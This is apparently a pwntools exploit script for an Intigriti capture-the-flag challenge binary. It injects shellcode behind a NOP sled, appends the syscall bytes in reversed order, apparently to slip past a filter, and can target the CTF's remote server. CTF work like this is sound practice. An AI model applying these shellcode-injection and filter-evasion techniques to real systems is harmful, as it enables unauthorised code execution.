from pwn import *

"""
b *forbidden+124
b *forbidden+62
b *forbidden+48
"""

gs = '''
b *main+197
continue
'''

elf = context.binary = ELF("./pwneame")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()
io.recvline()
io.recvline()

payload = asm(f"""
    mov rdi, 0x41
    mov rax, 0x3c
""")

payload = payload.rjust(98, b"\x90")

payload += b"\x05\x0f"
#payload += asm("svc") 

print(payload)
print("Len: ", len(payload))

io.send(payload)

io.interactive()